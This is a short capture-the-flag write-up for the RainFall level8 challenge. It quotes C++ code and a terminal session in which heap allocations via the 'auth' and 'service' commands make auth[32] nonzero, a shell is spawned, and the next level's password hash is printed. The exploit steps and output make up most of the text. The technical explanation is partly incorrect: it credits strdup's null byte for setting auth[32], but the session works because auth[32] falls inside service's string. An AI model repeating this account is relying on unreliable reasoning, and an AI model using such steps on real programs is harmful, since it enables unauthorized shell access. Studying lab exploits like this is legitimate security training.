Our goal is to make auth[32] != 0

```
    if (strncmp(buf, "auth ", 5) == 0)
    {
        auth = (char*)malloc(4);
        *auth = 0;

        char* input = buf + 5;
        if (strlen(input) <= 30)
        {
            strcpy(auth, input);
        }
    }

```
The auth alocate 4 bytes

```
    if (strncmp(buf, "service", 7) == 0)
    {
        char temp[121];
        strncpy(temp, buf + 8, sizeof(temp) - 1);
        temp[sizeof(temp) - 1] = '\0';

        service = strdup(temp);
    }
```
The service allocates memory by strdup just after auth 

Since the heap is contiguous, the allocation for service happens immediately after auth.

So if we overflow auth into service, then calling strdup() writes a \0 at the end of its copy potentially writing into auth[32]

then we can satisfy the condition of login and spawn a shell

```
    if (strncmp(buf, "login", 5) == 0)
    { 
        if (auth != nullptr && auth[32] != 0)
        {
            system("/bin/sh");
        }
        else 
        {
            std::cout << "Password:\n";
        }
    }
```

```
    level8@RainFall:~$ ./level8
    (nil), (nil) 
    auth hh
    0x804a008, (nil) 
    service ahgdbghbnjkjhyth
    0x804a008, 0x804a018 
    login
    $ cat /home/user/level9/.pass 
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```